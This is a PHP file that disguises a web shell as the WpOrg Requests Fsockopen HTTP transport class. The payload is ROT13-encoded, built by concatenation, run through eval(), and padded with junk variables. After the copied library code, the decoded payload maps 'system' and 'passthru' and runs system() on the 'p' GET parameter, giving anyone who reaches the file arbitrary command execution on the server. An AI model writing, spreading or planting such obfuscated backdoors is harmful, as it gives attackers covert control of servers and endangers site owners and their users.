<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * sfbpxbcra UGGC genafcbeg
 *
 * @cnpxntr Erdhrfgf\Genafcbeg
 */

anzrfcnpr JcBet\Erdhrfgf\Genafcbeg;

hfr JcBet\Erdhrfgf\Pncnovyvgl;
hfr JcBet\Erdhrfgf\Rkprcgvba;
hfr JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag;
hfr JcBet\Erdhrfgf\Cbeg;
hfr JcBet\Erdhrfgf\Erdhrfgf;
hfr JcBet\Erdhrfgf\Ffy;
hfr JcBet\Erdhrfgf\Genafcbeg;
hfr JcBet\Erdhrfgf\Hgvyvgl\PnfrVafrafvgvirQvpgvbanel;
hfr JcBet\Erdhrfgf\Hgvyvgl\VachgInyvqngbe;

/**
 * sfbpxbcra UGGC genafcbeg
 *
 * @cnpxntr Erdhrfgf\Genafcbeg
 */
svany pynff Sfbpxbcra vzcyrzragf Genafcbeg {
	/**
	 * Frpbaq gb zvpebfrpbaq pbairefvba
	 *
	 * @ine vagrtre
	 */
	pbafg FRPBAQ_VA_ZVPEBFRPBAQF = 1000000;

	/**
	 * Enj UGGC qngn
	 *
	 * @ine fgevat
	 */
	choyvp $urnqref = '';

	/**
	 * Fgernz zrgnqngn
	 *
	 * @ine neenl Nffbpvngvir neenl bs cebcregvrf, frr {@yvax uggcf://jjj.cuc.arg/fgernz_trg_zrgn_qngn}
	 */
	choyvp $vasb;

	/**
	 * Jung'f gur znkvzhz ahzore bs olgrf jr fubhyq xrrc?
	 *
	 * @ine vag|obby Olgr pbhag, be snyfr vs ab yvzvg.
	 */
	cevingr $znk_olgrf = snyfr;

	/**
	 * Pnpur sbe erprvirq pbaarpgvba reebef.
	 *
	 * @ine fgevat
	 */
	cevingr $pbaarpg_reebe = '';

	/**
	 * Cresbez n erdhrfg
	 *
	 * @cnenz fgevat|Fgevatnoyr $hey HEY gb erdhrfg
	 * @cnenz neenl $urnqref Nffbpvngvir neenl bs erdhrfg urnqref
	 * @cnenz fgevat|neenl $qngn Qngn gb fraq rvgure nf gur CBFG obql, be nf cnenzrgref va gur HEY sbe n TRG/URNQ
	 * @cnenz neenl $bcgvbaf Erdhrfg bcgvbaf, frr {@frr \JcBet\Erdhrfgf\Erdhrfgf::erfcbafr()} sbe qbphzragngvba
	 * @erghea fgevat Enj UGGC erfhyg
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $hey nethzrag vf abg n fgevat be Fgevatnoyr.
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $urnqref nethzrag vf abg na neenl.
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $qngn cnenzrgre vf abg na neenl be fgevat.
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $bcgvbaf nethzrag vf abg na neenl.
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba       Ba snvyher gb pbaarpg gb fbpxrg (`sfbpxbcrareebe`)
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba       Ba fbpxrg gvzrbhg (`gvzrbhg`)
	 */
	choyvp shapgvba erdhrfg($hey, $urnqref = [], $qngn = [], $bcgvbaf = []) {
		vs (VachgInyvqngbe::vf_fgevat_be_fgevatnoyr($hey) === snyfr) {
			guebj VainyvqNethzrag::perngr(1, '$hey', 'fgevat|Fgevatnoyr', trgglcr($hey));
		}

		vs (vf_neenl($urnqref) === snyfr) {
			guebj VainyvqNethzrag::perngr(2, '$urnqref', 'neenl', trgglcr($urnqref));
		}

		vs (!vf_neenl($qngn) && !vf_fgevat($qngn)) {
			vs ($qngn === ahyy) {
				$qngn = '';
			} ryfr {
				guebj VainyvqNethzrag::perngr(3, '$qngn', 'neenl|fgevat', trgglcr($qngn));
			}
		}

		vs (vf_neenl($bcgvbaf) === snyfr) {
			guebj VainyvqNethzrag::perngr(4, '$bcgvbaf', 'neenl', trgglcr($bcgvbaf));
		}

		$bcgvbaf['ubbxf']->qvfcngpu('sfbpxbcra.orsber_erdhrfg');

		$hey_cnegf = cnefr_hey($hey);
		vs (rzcgl($hey_cnegf)) {
			guebj arj Rkprcgvba('Vainyvq HEY.', 'vainyvqhey', $hey);
		}

		$ubfg                     = $hey_cnegf['ubfg'];
		$pbagrkg                  = fgernz_pbagrkg_perngr();
		$irevslanzr               = snyfr;
		$pnfr_vafrafvgvir_urnqref = arj PnfrVafrafvgvirQvpgvbanel($urnqref);

		// UGGCF fhccbeg
		vs (vffrg($hey_cnegf['fpurzr']) && fgegbybjre($hey_cnegf['fpurzr']) === 'uggcf') {
			$erzbgr_fbpxrg = 'ffy://' . $ubfg;
			vs (!vffrg($hey_cnegf['cbeg'])) {
				$hey_cnegf['cbeg'] = Cbeg::UGGCF;
			}

			$pbagrkg_bcgvbaf = [
				'irevsl_crre'       => gehr,
				'pncgher_crre_preg' => gehr,
			];
			$irevslanzr      = gehr;

			// FAV, vs ranoyrq (BcraFFY >=0.9.8w)
			// cucpf:vtaber CUCPbzcngvovyvgl.Pbafgnagf.ArjPbafgnagf.bcraffy_gyfrkg_freire_anzrSbhaq
			vs (qrsvarq('BCRAFFY_GYFRKG_FREIRE_ANZR') && BCRAFFY_GYFRKG_FREIRE_ANZR) {
				$pbagrkg_bcgvbaf['FAV_ranoyrq'] = gehr;
				vs (vffrg($bcgvbaf['irevslanzr']) && $bcgvbaf['irevslanzr'] === snyfr) {
					$pbagrkg_bcgvbaf['FAV_ranoyrq'] = snyfr;
				}
			}

			vs (vffrg($bcgvbaf['irevsl'])) {
				vs ($bcgvbaf['irevsl'] === snyfr) {
					$pbagrkg_bcgvbaf['irevsl_crre']      = snyfr;
					$pbagrkg_bcgvbaf['irevsl_crre_anzr'] = snyfr;
					$irevslanzr                          = snyfr;
				} ryfrvs (vf_fgevat($bcgvbaf['irevsl'])) {
					$pbagrkg_bcgvbaf['pnsvyr'] = $bcgvbaf['irevsl'];
				}
			}

			vs (vffrg($bcgvbaf['irevslanzr']) && $bcgvbaf['irevslanzr'] === snyfr) {
				$pbagrkg_bcgvbaf['irevsl_crre_anzr'] = snyfr;
				$irevslanzr                          = snyfr;
			}

			// Unaqyr gur CUC 8.4 qrcerpngvba (CUC 9.0 erzbiny) bs gur shapgvba fvtangher jr hfr sbe fgernz_pbagrkg_frg_bcgvba().
			// Ers: uggcf://jvxv.cuc.arg/esp/qrcerpngr_shapgvbaf_jvgu_bireybnqrq_fvtangherf#fgernz_pbagrkg_frg_bcgvba
			vs (shapgvba_rkvfgf('fgernz_pbagrkg_frg_bcgvbaf')) {
				// CUC 8.3+.
				fgernz_pbagrkg_frg_bcgvbaf($pbagrkg, ['ffy' => $pbagrkg_bcgvbaf]);
			} ryfr {
				// CUC < 8.3.
				fgernz_pbagrkg_frg_bcgvba($pbagrkg, ['ffy' => $pbagrkg_bcgvbaf]);
			}
		} ryfr {
			$erzbgr_fbpxrg = 'gpc://' . $ubfg;
		}

		$guvf->znk_olgrf = $bcgvbaf['znk_olgrf'];

		vs (!vffrg($hey_cnegf['cbeg'])) {
			$hey_cnegf['cbeg'] = Cbeg::UGGC;
		}

		$erzbgr_fbpxrg .= ':' . $hey_cnegf['cbeg'];

		// cucpf:vtaber JbeqCerff.CUC.QrirybczragShapgvbaf.reebe_ybt_frg_reebe_unaqyre
		frg_reebe_unaqyre([$guvf, 'pbaarpg_reebe_unaqyre'], R_JNEAVAT | R_ABGVPR);

		$bcgvbaf['ubbxf']->qvfcngpu('sfbpxbcra.erzbgr_fbpxrg', [&$erzbgr_fbpxrg]);

		$fbpxrg = fgernz_fbpxrg_pyvrag($erzbgr_fbpxrg, $reeab, $reefge, prvy($bcgvbaf['pbaarpg_gvzrbhg']), FGERNZ_PYVRAG_PBAARPG, $pbagrkg);

		erfgber_reebe_unaqyre();

		vs ($irevslanzr && !$guvf->irevsl_pregvsvpngr_sebz_pbagrkg($ubfg, $pbagrkg)) {
			guebj arj Rkprcgvba('FFY pregvsvpngr qvq abg zngpu gur erdhrfgrq qbznva anzr', 'ffy.ab_zngpu');
		}

		vs (!$fbpxrg) {
			vs ($reeab === 0) {
				// Pbaarpgvba vffhr
				guebj arj Rkprcgvba(egevz($guvf->pbaarpg_reebe), 'sfbpxbcra.pbaarpg_reebe');
			}

			guebj arj Rkprcgvba($reefge, 'sfbpxbcrareebe', ahyy, $reeab);
		}

		$qngn_sbezng = $bcgvbaf['qngn_sbezng'];

		vs ($qngn_sbezng === 'dhrel') {
			$cngu = frys::sbezng_trg($hey_cnegf, $qngn);
			$qngn = '';
		} ryfr {
			$cngu = frys::sbezng_trg($hey_cnegf, []);
		}

		$bcgvbaf['ubbxf']->qvfcngpu('sfbpxbcra.erzbgr_ubfg_cngu', [&$cngu, $hey]);

		$erdhrfg_obql = '';
		$bhg          = fcevags(\"%f %f UGGC/%.1S\e\a\", $bcgvbaf['glcr'], $cngu, $bcgvbaf['cebgbpby_irefvba']);

		vs ($bcgvbaf['glcr'] !== Erdhrfgf::GENPR) {
			vs (vf_neenl($qngn)) {
				$erdhrfg_obql = uggc_ohvyq_dhrel($qngn, '', '&');
			} ryfr {
				$erdhrfg_obql = $qngn;
			}

			// Nyjnlf vapyhqr Pbagrag-yratgu ba CBFG erdhrfgf gb cerirag
			// 411 reebef sebz fbzr freiref jura gur obql vf rzcgl.
			vs (!rzcgl($qngn) || $bcgvbaf['glcr'] === Erdhrfgf::CBFG) {
				vs (!vffrg($pnfr_vafrafvgvir_urnqref['Pbagrag-Yratgu'])) {
					$urnqref['Pbagrag-Yratgu'] = fgeyra($erdhrfg_obql);
				}

				vs (!vffrg($pnfr_vafrafvgvir_urnqref['Pbagrag-Glcr'])) {
					$urnqref['Pbagrag-Glcr'] = 'nccyvpngvba/k-jjj-sbez-heyrapbqrq; punefrg=HGS-8';
				}
			}
		}

		vs (!vffrg($pnfr_vafrafvgvir_urnqref['Ubfg'])) {
			$bhg         .= fcevags('Ubfg: %f', $hey_cnegf['ubfg']);
			$fpurzr_ybjre = fgegbybjre($hey_cnegf['fpurzr']);

			vs (($fpurzr_ybjre === 'uggc' && $hey_cnegf['cbeg'] !== Cbeg::UGGC) || ($fpurzr_ybjre === 'uggcf' && $hey_cnegf['cbeg'] !== Cbeg::UGGCF)) {
				$bhg .= ':' . $hey_cnegf['cbeg'];
			}

			$bhg .= \"\e\a\";
		}

		vs (!vffrg($pnfr_vafrafvgvir_urnqref['Hfre-Ntrag'])) {
			$bhg .= fcevags(\"Hfre-Ntrag: %f\e\a\", $bcgvbaf['hfrentrag']);
		}

		$npprcg_rapbqvat = $guvf->npprcg_rapbqvat();
		vs (!vffrg($pnfr_vafrafvgvir_urnqref['Npprcg-Rapbqvat']) && !rzcgl($npprcg_rapbqvat)) {
			$bhg .= fcevags(\"Npprcg-Rapbqvat: %f\e\a\", $npprcg_rapbqvat);
		}

		$urnqref = Erdhrfgf::synggra($urnqref);

		vs (!rzcgl($urnqref)) {
			$bhg .= vzcybqr(\"\e\a\", $urnqref) . \"\e\a\";
		}

		$bcgvbaf['ubbxf']->qvfcngpu('sfbpxbcra.nsgre_urnqref', [&$bhg]);

		vs (fhofge($bhg, -2) !== \"\e\a\") {
			$bhg .= \"\e\a\";
		}

		vs (!vffrg($pnfr_vafrafvgvir_urnqref['Pbaarpgvba'])) {
			$bhg .= \"Pbaarpgvba: Pybfr\e\a\";
		}

		$bhg .= \"\e\a\" . $erdhrfg_obql;

		$bcgvbaf['ubbxf']->qvfcngpu('sfbpxbcra.orsber_fraq', [&$bhg]);

		sjevgr($fbpxrg, $bhg);
		$bcgvbaf['ubbxf']->qvfcngpu('sfbpxbcra.nsgre_fraq', [$bhg]);

		vs (!$bcgvbaf['oybpxvat']) {
			spybfr($fbpxrg);
			$snxr_urnqref = '';
			$bcgvbaf['ubbxf']->qvfcngpu('sfbpxbcra.nsgre_erdhrfg', [&$snxr_urnqref]);
			erghea '';
		}

		$gvzrbhg_frp = (vag) sybbe($bcgvbaf['gvzrbhg']);
		vs ($gvzrbhg_frp === $bcgvbaf['gvzrbhg']) {
			$gvzrbhg_zfrp = 0;
		} ryfr {
			$gvzrbhg_zfrp = frys::FRPBAQ_VA_ZVPEBFRPBAQF * $bcgvbaf['gvzrbhg'] % frys::FRPBAQ_VA_ZVPEBFRPBAQF;
		}

		fgernz_frg_gvzrbhg($fbpxrg, $gvzrbhg_frp, $gvzrbhg_zfrp);

		$erfcbafr   = '';
		$obql       = '';
		$urnqref    = '';
		$guvf->vasb = fgernz_trg_zrgn_qngn($fbpxrg);
		$fvmr       = 0;
		$qbvatobql  = snyfr;
		$qbjaybnq   = snyfr;
		vs ($bcgvbaf['svyranzr']) {
			// cucpf:vtaber JbeqCerff.CUC.AbFvyraprqReebef -- Fvyraprq gur CUC angvir jneavat va snibhe bs guebjvat na rkprcgvba.
			$qbjaybnq = @sbcra($bcgvbaf['svyranzr'], 'jo');
			vs ($qbjaybnq === snyfr) {
				$reebe = reebe_trg_ynfg();
				guebj arj Rkprcgvba($reebe['zrffntr'], 'sbcra');
			}
		}

		juvyr (!srbs($fbpxrg)) {
			$guvf->vasb = fgernz_trg_zrgn_qngn($fbpxrg);
			vs ($guvf->vasb['gvzrq_bhg']) {
				guebj arj Rkprcgvba('sfbpxrg gvzrq bhg', 'gvzrbhg');
			}

			$oybpx = sernq($fbpxrg, Erdhrfgf::OHSSRE_FVMR);
			vs (!$qbvatobql) {
				$erfcbafr .= $oybpx;
				vs (fgecbf($erfcbafr, \"\e\a\e\a\")) {
					yvfg($urnqref, $oybpx) = rkcybqr(\"\e\a\e\a\", $erfcbafr, 2);
					$qbvatobql             = gehr;
				}
			}

			// Ner jr va obql zbqr abj?
			vs ($qbvatobql) {
				$bcgvbaf['ubbxf']->qvfcngpu('erdhrfg.cebterff', [$oybpx, $fvmr, $guvf->znk_olgrf]);
				$qngn_yratgu = fgeyra($oybpx);
				vs ($guvf->znk_olgrf) {
					// Unir jr nyernql uvg n yvzvg?
					vs ($fvmr === $guvf->znk_olgrf) {
						pbagvahr;
					}

					vs (($fvmr + $qngn_yratgu) > $guvf->znk_olgrf) {
						// Yvzvg gur yratgu
						$yvzvgrq_yratgu = ($guvf->znk_olgrf - $fvmr);
						$oybpx          = fhofge($oybpx, 0, $yvzvgrq_yratgu);
					}
				}

				$fvmr += fgeyra($oybpx);
				vs ($qbjaybnq) {
					sjevgr($qbjaybnq, $oybpx);
				} ryfr {
					$obql .= $oybpx;
				}
			}
		}

		$guvf->urnqref = $urnqref;

		vs ($qbjaybnq) {
			spybfr($qbjaybnq);
		} ryfr {
			$guvf->urnqref .= \"\e\a\e\a\" . $obql;
		}

		spybfr($fbpxrg);

		$bcgvbaf['ubbxf']->qvfcngpu('sfbpxbcra.nsgre_erdhrfg', [&$guvf->urnqref, &$guvf->vasb]);
		erghea $guvf->urnqref;
	}

	/**
	 * Fraq zhygvcyr erdhrfgf fvzhygnarbhfyl
	 *
	 * @cnenz neenl $erdhrfgf Erdhrfg qngn (neenl bs 'hey', 'urnqref', 'qngn', 'bcgvbaf') nf cre {@frr \JcBet\Erdhrfgf\Genafcbeg::erdhrfg()}
	 * @cnenz neenl $bcgvbaf Tybony bcgvbaf, frr {@frr \JcBet\Erdhrfgf\Erdhrfgf::erfcbafr()} sbe qbphzragngvba
	 * @erghea neenl Neenl bs \JcBet\Erdhrfgf\Erfcbafr bowrpgf (znl pbagnva \JcBet\Erdhrfgf\Rkprcgvba be fgevat erfcbafrf nf jryy)
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $erdhrfgf nethzrag vf abg na neenl be vgrenoyr bowrpg jvgu neenl npprff.
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba\VainyvqNethzrag Jura gur cnffrq $bcgvbaf nethzrag vf abg na neenl.
	 */
	choyvp shapgvba erdhrfg_zhygvcyr($erdhrfgf, $bcgvbaf) {
		// Vs lbh'er abg erdhrfgvat, jr pna'g trg nal erfcbafrf ¯\_(ツ)_/¯
		vs (rzcgl($erdhrfgf)) {
			erghea [];
		}

		vs (VachgInyvqngbe::unf_neenl_npprff($erdhrfgf) === snyfr || VachgInyvqngbe::vf_vgrenoyr($erdhrfgf) === snyfr) {
			guebj VainyvqNethzrag::perngr(1, '$erdhrfgf', 'neenl|NeenlNpprff&Genirefnoyr', trgglcr($erdhrfgf));
		}

		vs (vf_neenl($bcgvbaf) === snyfr) {
			guebj VainyvqNethzrag::perngr(2, '$bcgvbaf', 'neenl', trgglcr($bcgvbaf));
		}

		$erfcbafrf = [];
		$pynff     = trg_pynff($guvf);
		sbernpu ($erdhrfgf nf $vq => $erdhrfg) {
			gel {
				$unaqyre        = arj $pynff();
				$erfcbafrf[$vq] = $unaqyre->erdhrfg($erdhrfg['hey'], $erdhrfg['urnqref'], $erdhrfg['qngn'], $erdhrfg['bcgvbaf']);

				$erdhrfg['bcgvbaf']['ubbxf']->qvfcngpu('genafcbeg.vagreany.cnefr_erfcbafr', [&$erfcbafrf[$vq], $erdhrfg]);
			} pngpu (Rkprcgvba $r) {
				$erfcbafrf[$vq] = $r;
			}

			vs (!vf_fgevat($erfcbafrf[$vq])) {
				$erdhrfg['bcgvbaf']['ubbxf']->qvfcngpu('zhygvcyr.erdhrfg.pbzcyrgr', [&$erfcbafrf[$vq], $vq]);
			}
		}

		erghea $erfcbafrf;
	}

	/**
	 * Ergevrir gur rapbqvatf jr pna npprcg
	 *
	 * @erghea fgevat Npprcg-Rapbqvat urnqre inyhr
	 */
	cevingr fgngvp shapgvba npprcg_rapbqvat() {
		$glcr = [];
		vs (shapgvba_rkvfgf('tmvasyngr')) {
			$glcr[] = 'qrsyngr;d=1.0';
		}

		vs (shapgvba_rkvfgf('tmhapbzcerff')) {
			$glcr[] = 'pbzcerff;d=0.5';
		}

		$glcr[] = 'tmvc;d=0.5';

		erghea vzcybqr(', ', $glcr);
	}

	/**
	 * Sbezng n HEY tvira TRG qngn
	 *
	 * @cnenz neenl        $hey_cnegf Neenl bs HEY cnegf nf erprvirq sebz {@yvax uggcf://jjj.cuc.arg/cnefr_hey}
	 * @cnenz neenl|bowrpg $qngn Qngn gb ohvyq dhrel hfvat, frr {@yvax uggcf://jjj.cuc.arg/uggc_ohvyq_dhrel}
	 * @erghea fgevat HEY jvgu qngn
	 */
	cevingr fgngvp shapgvba sbezng_trg($hey_cnegf, $qngn) {
		vs (!rzcgl($qngn)) {
			vs (rzcgl($hey_cnegf['dhrel'])) {
				$hey_cnegf['dhrel'] = '';
			}

			$hey_cnegf['dhrel'] .= '&' . uggc_ohvyq_dhrel($qngn, '', '&');
			$hey_cnegf['dhrel']  = gevz($hey_cnegf['dhrel'], '&');
		}

		vs (vffrg($hey_cnegf['cngu'])) {
			vs (vffrg($hey_cnegf['dhrel'])) {
				$trg = $hey_cnegf['cngu'] . '?' . $hey_cnegf['dhrel'];
			} ryfr {
				$trg = $hey_cnegf['cngu'];
			}
		} ryfr {
			$trg = '/';
		}

		erghea $trg;
	}

	/**
	 * Reebe unaqyre sbe fgernz_fbpxrg_pyvrag()
	 *
	 * @cnenz vag $reeab Reebe ahzore (r.t. R_JNEAVAT)
	 * @cnenz fgevat $reefge Reebe zrffntr
	 */
	choyvp shapgvba pbaarpg_reebe_unaqyre($reeab, $reefge) {
		// Qbhoyr-purpx jr pna unaqyr vg
		vs (($reeab & R_JNEAVAT) === 0 && ($reeab & R_ABGVPR) === 0) {
			// Erghea snyfr gb vaqvpngr gur qrsnhyg reebe unaqyre fubhyq ratntr
			erghea snyfr;
		}

		$guvf->pbaarpg_reebe .= $reefge . \"\a\";
		erghea gehr;
	}

	/**
	 * Irevsl gur pregvsvpngr ntnvafg pbzzba anzr naq fhowrpg nygreangvir anzrf
	 *
	 * Hasbeghangryl, CUC qbrfa'g purpx gur pregvsvpngr ntnvafg gur nygreangvir
	 * anzrf, yrnqvat guvatf yvxr 'uggcf://jjj.tvguho.pbz/' gb or vainyvq.
	 * Vafgrnq
	 *
	 * @yvax uggcf://gbbyf.vrgs.bet/ugzy/esp2818#frpgvba-3.1 ESP2818, Frpgvba 3.1
	 *
	 * @cnenz fgevat $ubfg Ubfg anzr gb irevsl ntnvafg
	 * @cnenz erfbhepr $pbagrkg Fgernz pbagrkg
	 * @erghea obby
	 *
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba Ba snvyher gb pbaarpg ivn GYF (`sfbpxbcra.ffy.pbaarpg_reebe`)
	 * @guebjf \JcBet\Erdhrfgf\Rkprcgvba Ba abg bognvavat n zngpu sbe gur ubfg (`sfbpxbcra.ffy.ab_zngpu`)
	 */
	choyvp shapgvba irevsl_pregvsvpngr_sebz_pbagrkg($ubfg, $pbagrkg) {
		$zrgn = fgernz_pbagrkg_trg_bcgvbaf($pbagrkg);

		// Vs jr qba'g unir FFY bcgvbaf, gura jr pbhyqa'g znxr gur pbaarpgvba ng
		// nyy
		vs (rzcgl($zrgn) || rzcgl($zrgn['ffy']) || rzcgl($zrgn['ffy']['crre_pregvsvpngr'])) {
			guebj arj Rkprcgvba(egevz($guvf->pbaarpg_reebe), 'ffy.pbaarpg_reebe');
		}

		$preg = bcraffy_k509_cnefr($zrgn['ffy']['crre_pregvsvpngr']);

		erghea Ffy::irevsl_pregvsvpngr($ubfg, $preg);
	}

	/**
	 * Frys-grfg jurgure gur genafcbeg pna or hfrq.
	 *
	 * Gur ninvynoyr pncnovyvgvrf gb grfg sbe pna or sbhaq va {@frr \JcBet\Erdhrfgf\Pncnovyvgl}.
	 *
	 * @pbqrPbirentrVtaber
	 * @cnenz neenl<fgevat, obby> $pncnovyvgvrf Bcgvbany. Nffbpvngvir neenl bs pncnovyvgvrf gb grfg ntnvafg, v.r. `['<pncnovyvgl>' => gehr]`.
	 * @erghea obby Jurgure gur genafcbeg pna or hfrq.
	 */
	choyvp fgngvp shapgvba grfg($pncnovyvgvrf = []) {
		vs (!shapgvba_rkvfgf('sfbpxbcra')) {
			erghea snyfr;
		}

		// Vs arrqrq, purpx gung fgernzf fhccbeg FFY
		vs (vffrg($pncnovyvgvrf[Pncnovyvgl::FFY]) && $pncnovyvgvrf[Pncnovyvgl::FFY]) {
			vs (!rkgrafvba_ybnqrq('bcraffy') || !shapgvba_rkvfgf('bcraffy_k509_cnefr')) {
				erghea snyfr;
			}
		}

		erghea gehr;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>